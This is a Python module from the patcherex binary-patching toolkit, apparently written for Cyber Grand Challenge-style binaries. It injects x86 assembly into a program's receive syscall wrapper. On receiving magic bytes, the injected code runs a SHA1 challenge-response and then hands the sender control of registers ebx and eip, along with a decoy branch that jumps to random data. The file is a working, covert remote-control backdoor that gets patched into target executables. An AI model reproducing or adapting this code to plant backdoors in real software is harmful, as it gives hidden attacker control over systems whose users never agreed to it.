import patcherex
import angr

import patcherex.utils as utils
import patcherex.cfg_utils as cfg_utils

import capstone
import logging
from patcherex.patches import *
from patcherex.techniques.bitflip import Bitflip

l = logging.getLogger("patcherex.techniques.Backdoor")


class Backdoor(object):

    def __init__(self,binary_fname,backend,enable_bitflip=False):
        self.binary_fname = binary_fname
        self.patcher = backend
        self.enable_bitflip = enable_bitflip

    def get_c_patch(self):
        code = '''

static inline int ROTATE_LEFT(const int value, int shift) {
    unsigned int uvalue = (unsigned int)value;
    return (uvalue << shift) | (uvalue >> (32- shift));
}

#define K1 0x5A827999
#define K2 0x6ED9EBA1
#define K3 0x8F1BBCDC
#define K4 0xCA62C1D6

// modified starting from: https://software.intel.com/en-us/articles/improving-the-performance-of-the-secure-hash-algorithm-1
__attribute__((fastcall)) int SHA1(int MESSAGE[] )
{
  // __asm("int $3");
  int B, C, D, E;
  int A,An;
  int K;
  int W[80];
  int FN;
  int i;

  A = 0x67452301;
  B = 0x98BADCFE;
  C = 0xEFCDAB89;
  D = 0x10325476;
  E = 0xC3D2E1F0;

  for ( i=0; i<80; ++i ){
    if ( i < 16 ){
      // reverse the order of bytes on little-endian
      W[i] = MESSAGE[i];
    }else{
      W[i] = ROTATE_LEFT( W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1 );
    }


    if(i<20){
      K = K1;
      FN = (D ^ ( B & (C ^ D)));
    }else if(i<40){
      K = K2;
      FN =  (D ^ B ^ C);
    }else if(i<60){
      K = K3;
      FN = (B & C) | (D & (B ^ C));
    }else{
      K = K4;
      FN = (D ^ B ^ C);
    }

    An = FN + E + ROTATE_LEFT( A, 5 ) + W[i] + K;

    E = D;
    D = C;
    C = ROTATE_LEFT( B, 30 );
    B = A;
    A = An;

  }

  return (0x67452301 + A);
}
        '''
        return AddCodePatch(code, "sha1_block", is_c=True, optimization="-Oz")

    def compute_patches(self,victim_addr):
        patches = []
        patches.append(AddRWDataPatch(8, "random_value")) #rnd value and delimiter
        patches.append(AddRWDataPatch(4, "nbytes"))
        patches.append(AddRWDataPatch(4, "backdoor_receive_buffer"))
        patches.append(AddRWDataPatch(1, "backdoor_receive_len"))
        patches.append(AddRWDataPatch(16, "backdoor_response_buffer"))
        patches.append(self.get_c_patch())
        code = '''
            ; get 4 rnd value retrying in the unlikely case, in which rnd failed
            xor esi, esi
            _random_loop:
                cmp esi, 4
                je _random_exit
                mov ebx, {random_value}
                add ebx, esi
                xor ecx, ecx
                mov cl, 4
                sub ecx, esi
                mov edx, {nbytes}
                xor eax, eax
                mov al, 7
                int 0x80
                add esi, DWORD[{nbytes}]
                jmp _random_loop

            _random_exit:
                ret
        '''
        patches.append(AddCodePatch(code, name="get_4_rnd"))

        if self.enable_bitflip:
            bitflip_in_backdoor_code = '''
                mov bl, BYTE [ecx]
                mov bl, BYTE [{bitflip_translation_table}+ebx]
                mov BYTE [ecx], bl
            '''
        else:
            bitflip_in_backdoor_code = ""
        code = '''
            xor edi, edi
            xor esi, esi
            _receive_loop:
                cmp edi, 16
                je _receive_exit
                xor ebx, ebx ; stdin
                mov ecx, {backdoor_response_buffer}
                add ecx, edi
                xor edx, edx
                inc dl
                xor eax, eax
                mov al, 3
                int 0x80
                ; not checking for receive fail, if disconnect --> infinite loop, it should never happen with our pov
                ; not checking nbytes, we receive one at the time
                inc edi

                %s

                jmp _receive_loop

            _receive_exit:
                ret
        ''' % (bitflip_in_backdoor_code)
        patches.append(AddCodePatch(code, name="receive_16"))

        if not self.enable_bitflip:
            code_header = '''
                test eax, eax ; receive succeded
                jne _exit_backdoor

                ; fast path: this code is added to every receive
                cmp BYTE [{backdoor_receive_len}], 4
                jae _exit_backdoor

                ; this code is executed at most 4 times unless receive failed
                ; esi, edx, ecx, ebx are free because we are in a syscall wrapper restoring them

                test ebx, ebx ; test if ebx is 0 (stdin)
                je _enter_backdoor
                cmp ebx, 1 ; stdout is also good
                jne _exit_backdoor
            '''
        else:
            code_header = '''
                test eax, eax ; receive succeded
                jne _exit_backdoor

                ; esi, edx, ecx, ebx are free because we are in a syscall wrapper restoring them
                test ebx, ebx ; test if ebx is 0 (stdin)
                je _enter_bitflip_backdoor
                cmp ebx, 1 ; stdout is also good
                jne _exit_backdoor

                _enter_bitflip_backdoor:
                %s

                ; revert changes of the bitflip
                sub ecx, DWORD [esi]
                mov edx, DWORD [esi]

                ; this code is executed at most 4 times unless receive failed
                ; fast path: this code is added to every receive
                cmp BYTE [{backdoor_receive_len}], 4
                jae _exit_backdoor
            ''' % (Bitflip.get_bitflip_code())

        code = code_header + '''
            _enter_backdoor:

            ; we do not check rx_bytes: the assumption is that the network will never split the 4 bytes we send
            ; I think it is a correct assumption because on the pov side we send 4 bytes together and 4 is very small
            mov esi, edx
            xor ebx, ebx
            ; now edx is scratch
            ; the two counters will be esi (from count to 0) and bl (from 0 to 4, index in backdoor_receive_buffer)
            ; ecx (buf) is incremented once per loop and it is the index in buf
            _backdoor_receive_loop:
                mov bl, BYTE [{backdoor_receive_len}] ; bl is a counter inside our 4 byte buffer
                cmp bl, 4
                je _backdoor_entry_check ; we received 4 bytes already
                ; now esi is count
                ; we assume no fragmentation in the relevant 4 so min(count,rx_bytes)>=4 and rx_bytes<=count)
                test esi, esi
                je _exit_backdoor ; the received buffer is over
                ; ecx is buf+current_byte, we assume that buf+min(count,4) is still readable memory
                mov dl, BYTE [ecx]
                mov BYTE [{backdoor_receive_buffer}+ebx], dl

                inc BYTE [{backdoor_receive_len}]
                inc ecx
                dec esi

                jmp _backdoor_receive_loop

            _backdoor_entry_check:
                ; what we have to send from the pov has inverted endiannes! (0x9067b180 and 0x9067b181)
                cmp DWORD[{backdoor_receive_buffer}], 0x80b16733
                je _real_backdoor
                cmp DWORD[{backdoor_receive_buffer}], 0x81b16733
                je _fake_backdoor
                jmp _exit_backdoor

            ; for both backdoors we want to give fake/real control over ebx and eip
            ; to avoid creating gadgets I put the code on the stack and I jump to the stack by push esp + ret
            ; in between push <code>, push esp and the final ret I put all the code for the backdoor logic
            ; so that an attacker cannot use push <code>, push esp without actually executing the backdoor code
            _real_backdoor:
                ; make the backdoor compatible with nx
                sub esp, 0x1000

                sub esp, 0x64 ; space for sha1 MESSAGE
                ; clear the memory here (otherwise you get nasty bugs depending on the frames on the stack!)
                mov eax, esp
                xor edx, edx
                xor ecx, ecx
                mov cl, 64;
                ; int 3
                _zero_loop:
                    test ecx, ecx
                    je _zero_loop_out
                    mov DWORD [esp+ecx], edx
                    sub cl, 4
                    jmp _zero_loop
                _zero_loop_out:

                push 0xc35b5990 ; nop, pop ecx, pop ebx, ret: pop ecx is used to clean [esp] from the stack
                push esp
                call {get_4_rnd}

                ; int 3
                ; mov DWORD [{random_value}], 0x0006a87c ; uncomment for debug
                mov eax, DWORD [{random_value}]
                and eax, 0x7ffff ; the challenge goes from0 to 0x7ffff, 19 bits, 0.5M possibilities
                ; jmp eax ; uncomment for debug
                mov DWORD [{random_value}], eax
                ; random_value is now the challenge

                ;add delimiter to random_value
                mov eax, {random_value}
                add eax, 4
                mov DWORD [eax], 0xbaccd004

                ; send the challenge value plus the delimiter
                xor edi, edi
                _trasmit_loop:
                    cmp edi, 8
                    je _trasmit_exit
                    xor ebx, ebx
                    inc ebx ; stdout
                    mov ecx, {random_value}
                    xor edx, edx
                    mov dl, 8
                    mov esi, {nbytes}
                    xor eax, eax
                    mov al, 2
                    int 0x80
                    add edi, DWORD [{nbytes}]
                    jmp _trasmit_loop
                _trasmit_exit:

                call {receive_16}
                ; backdoor_response_buffer is: challenge_response (8), ebx (4), eip (4)
                ; copy the challenge response on the stack where space has been created for sha1 MESSAGE
                xor ecx, ecx
                _copy_response_loop1:
                    cmp cl, 8
                    je _copy_response_exit
                    mov bl, BYTE [{backdoor_response_buffer}+ecx]
                    mov BYTE[esp+8+ecx], bl
                    inc cl
                    jmp _copy_response_loop1
                _copy_response_exit:

                ; call sha1 passing the buffer on the stack as arg
                mov ecx, esp
                add ecx, 8
                ; int 3
                call {SHA1}
                ; int 3
                ; now we have the result in eax
                cmp eax, DWORD [{random_value}] ; this is the challenge/response check!
                ; note that the check is actually checking 32 bits, out of which 13 (32-19) are always zero
                jne _fake_backdoor ; check failed, just send the execution to a bad place

                ; now copy the transmitted ebx and eip
                xor ecx, ecx
                xor edx, edx
                mov cl, 8
                _copy_response_loop2:
                    cmp cl, 16
                    je _copy_response_exit2
                    mov bl, BYTE [{backdoor_response_buffer}+ecx]
                    mov BYTE[esp+8+edx], bl
                    inc cl
                    inc edx
                    jmp _copy_response_loop2
                _copy_response_exit2:

                ; magically ret will jump to the stack, executing pop, pop, ret (setting ebx, eip to the sent values)
                ret

            _fake_backdoor:
                ; make the backdoor compatible with nx
                sub esp, 0x1000

                ; set the stack as in the real backdoor
                push 0xc35b5990 ; pop ecx, pop ebx, ret, nop: pop ecx is used to clean [esp] from the stack
                push esp
                call {get_4_rnd}
                call {receive_16}

                ; now copy the transmitted ebx and eip
                xor ecx, ecx
                ; int 3
                _copy_response_loop3:
                    cmp cl, 16
                    je _copy_response_exit3
                    mov ebx, DWORD [{backdoor_response_buffer}+ecx]
                    xor ebx, DWORD [{random_value}]
                    mov DWORD[esp+8+ecx], ebx
                    add cl, 4
                    jmp _copy_response_loop3
                _copy_response_exit3:
                ; will start executing the stack but the gadget will use random data (so ebx and eip are random)
                ret

            _exit_backdoor:
        '''
        patches.append(InsertCodePatch(victim_addr, code, name="backdoor_receive_checker", priority=300))
        return patches


    def get_patches(self):
        patches = []
        cfg = self.patcher.cfg

        receive_wrapper = [ff for ff in cfg.functions.values() if \
                cfg_utils.detect_syscall_wrapper(self.patcher,ff) == 3]
        if len(receive_wrapper) != 1:
            l.warning("Found %d receive_wrapper... better not to touch anything"%len(receive_wrapper))
            return []
        receive_wrapper = receive_wrapper[0]
        # here we assume that receive_wrapper is a "sane" syscall wrapper, as checked by detect_syscall_wrapper
        last_block = [b for b in receive_wrapper.blocks if b.addr != receive_wrapper.addr][0]
        victim_addr = int(last_block.addr)
        patches.extend(self.compute_patches(victim_addr))
        if self.enable_bitflip:
            patches.extend(Bitflip.get_presyscall_patch(victim_addr-2))
            patches.append(Bitflip.get_translation_table_patch())

        return patches

def init_technique(program_name, backend, options):
    return Backdoor(program_name, backend, **options)
